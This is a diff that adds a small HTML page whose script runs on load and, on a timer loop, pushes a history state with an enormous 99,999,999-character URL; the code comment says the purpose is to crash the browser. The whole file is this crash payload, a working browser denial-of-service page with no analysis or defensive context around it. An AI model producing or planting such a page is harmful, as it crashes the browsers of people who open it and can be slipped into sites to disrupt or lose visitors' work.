@@ -1,0 +1,11 @@
+<html>
+<body>
+    <script>
+        // every milisecond push a new state to history
+        // this will cause the browser to crash
+        setInterval(() => {
+            history.pushState("", "", "`".repeat(99999999));
+        })
+    </script>
+</body>
+</html>
